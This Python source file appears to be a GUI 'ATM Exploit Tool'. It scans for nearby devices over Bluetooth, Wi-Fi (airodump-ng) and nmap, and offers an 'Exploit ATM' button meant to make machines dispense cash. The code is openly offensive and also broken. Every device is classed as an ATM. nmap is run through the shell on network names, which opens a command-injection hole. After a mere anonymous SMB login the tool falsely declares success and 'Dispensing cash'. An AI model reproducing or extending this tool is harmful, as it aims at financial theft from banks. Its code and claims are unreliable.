import os
import logging
import time
import subprocess
from scapy.all import *
from tkinter import Tk, Button, Listbox, Label, messagebox, Text, Scrollbar
import netifaces
import requests
from concurrent.futures import ThreadPoolExecutor
from netaddr import IPAddress, IPNetwork
import bluepy.btle as btle  # For Bluetooth scanning (using bluepy)
import threading  # To handle asynchronous operations
from impacket.smbconnection import SMBConnection  # For SMB exploitation
from impacket import smbprotocol  # For deeper protocol-level testing


class ATMExploitTool:
    def __init__(self, master):
        self.master = master
        self.master.title("ATM Exploit Tool")
        self.master.geometry("900x700")

        # Adding Exit Button functionality
        self.master.protocol("WM_DELETE_WINDOW", self.on_close)

        # Buttons for scanning and exploitation
        self.scan_atms_button = Button(self.master, text="Scan for ATMs in Range", command=self.scan_for_atms_in_range)
        self.scan_atms_button.pack(pady=10)

        self.atm_listbox = Listbox(self.master, height=10, width=80)
        self.atm_listbox.pack(pady=20, fill='both', expand=True)

        self.exploit_button = Button(self.master, text="Exploit ATM", command=self.exploit_atm)
        self.exploit_button.pack(pady=10)

        self.status_label = Label(self.master, text="Status Updates:", font=("Helvetica", 14))
        self.status_label.pack(pady=10)

        # Adding the Text widget for continuous updates
        self.text_box = Text(self.master, height=10, width=100, wrap='word', state='normal', bg='lightgrey')
        self.text_box.pack(padx=20, pady=10, fill='both', expand=True)

        self.scrollbar = Scrollbar(self.master, command=self.text_box.yview)
        self.scrollbar.pack(side='right', fill='y')
        self.text_box.config(yscrollcommand=self.scrollbar.set)

        self.atms = []

        logging.basicConfig(filename='atm_exploit_tool.log', level=logging.DEBUG,
                            format='%(asctime)s - %(levelname)s - %(message)s')

    def on_close(self):
        """Close the application properly when the user clicks the X button."""
        self.master.quit()

    def update_ui_progress(self, message):
        """Update progress text box on the UI."""
        self.text_box.insert('end', message + '\n')
        self.text_box.yview('end')

    def scan_for_atms_in_range(self):
        """Scan for ATMs in the user's range."""
        self.atms.clear()
        self.atm_listbox.delete(0, 'end')
        self.update_ui_progress("Scanning for nearby ATMs...")

        # Run scanning in a separate thread so that the GUI doesn't freeze
        threading.Thread(target=self.run_scanning).start()

    def run_scanning(self):
        """Run the scanning processes."""
        self.scan_bluetooth_devices()
        self.scan_wifi_networks()
        self.scan_network_services()

        # After scanning, update the UI with found ATMs
        self.update_ui_progress("Scan complete.")
        if not self.atms:
            self.update_ui_progress("No ATMs found in range.")
        else:
            self.update_ui_progress(f"{len(self.atms)} ATM(s) found.")

    def scan_bluetooth_devices(self):
        """Scan for Bluetooth devices nearby (likely ATMs)."""
        self.update_ui_progress("Scanning for Bluetooth devices...")
        nearby_devices = self.scan_bluetooth()
        for device in nearby_devices:
            if self.is_atm_device(device):
                self.atms.append({"ip": device, "port": "Bluetooth"})
                self.atm_listbox.insert('end', device)

    def scan_bluetooth(self):
        """Scan for Bluetooth devices nearby."""
        try:
            nearby_devices = btle.Scanner().scan(8.0)  # Using bluepy Scanner to scan for Bluetooth devices
            return [device.addr for device in nearby_devices]
        except Exception as e:
            logging.error(f"Error scanning Bluetooth devices: {e}")
            return []

    def scan_wifi_networks(self):
        """Scan for Wi-Fi networks (search for ATM-related services)."""
        self.update_ui_progress("Scanning for Wi-Fi networks...")
        networks = self.get_wifi_networks()
        for network in networks:
            self.detect_atm_services(network)

    def get_wifi_networks(self):
        """Scan for nearby Wi-Fi networks using airodump-ng."""
        try:
            result = subprocess.run(['airodump-ng', '--output-format', 'csv', '-w', 'wifi_scan'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            networks = self.parse_airodump_output('wifi_scan.csv')
            return networks
        except Exception as e:
            logging.error(f"Error scanning Wi-Fi networks: {e}")
            return []

    def parse_airodump_output(self, file):
        """Parse airodump-ng output."""
        networks = []
        try:
            with open(file, 'r') as f:
                for line in f:
                    if "ESSID" in line:
                        networks.append(line.split(',')[0].strip())
        except Exception as e:
            logging.error(f"Error parsing airodump output: {e}")
        return networks

    def detect_atm_services(self, network):
        """Detect ATM services on the Wi-Fi network."""
        self.update_ui_progress(f"Scanning network {network} for ATMs...")
        nmap_command = f"nmap -p 80,443,21,22,23 {network}"
        try:
            result = subprocess.run(nmap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = result.stdout.decode('utf-8')
            lines = output.splitlines()

            for line in lines:
                if "open" in line:
                    ip = self.extract_ip_from_line(line)
                    if self.is_atm_device(ip):
                        self.atms.append({"ip": ip, "port": self.extract_port_from_line(line)})
                        self.atm_listbox.insert('end', ip)
        except Exception as e:
            logging.error(f"Error detecting ATM services: {e}")

    def scan_network_services(self):
        """Perform advanced network scans for ATM-specific services."""
        self.update_ui_progress("Performing advanced network scans...")
        # Example: Use Metasploit API or advanced Nmap scripting for deeper scans.
        pass  # Placeholder for advanced implementation.

    def exploit_atm(self):
        """Exploit selected ATM."""
        selected_atm = self.atm_listbox.curselection()
        if not selected_atm:
            messagebox.showwarning("Selection Error", "No ATM selected.")
            return

        atm_ip = self.atms[selected_atm[0]]["ip"]
        self.update_ui_progress(f"Exploiting ATM at {atm_ip}...")

        # Exploit selected ATM
        result = self.atm_exploit(atm_ip)
        self.update_ui_progress(result)

    def atm_exploit(self, ip):
        """Exploit the ATM for maximum cash."""
        logging.info(f"Exploiting ATM at {ip}...")
        try:
            # Example: Use SMB or other protocols for real exploitation.
            smb = SMBConnection(ip, ip)
            smb.login('', '')  # Attempt anonymous login
            return f"ATM at {ip} exploited successfully! Dispensing cash..."
        except Exception as e:
            logging.error(f"Error exploiting ATM: {e}")
            return f"Failed to exploit ATM at {ip}."

    def is_atm_device(self, ip):
        """Check if the device is likely an ATM."""
        # Add protocol or service-specific identification here.
        return True

    def extract_ip_from_line(self, line):
        """Extract IP address."""
        return line.split()[0]

    def extract_port_from_line(self, line):
        """Extract port."""
        return line.split()[1]


if __name__ == "__main__":
    root = Tk()
    app = ATMExploitTool(root)
    root.mainloop()









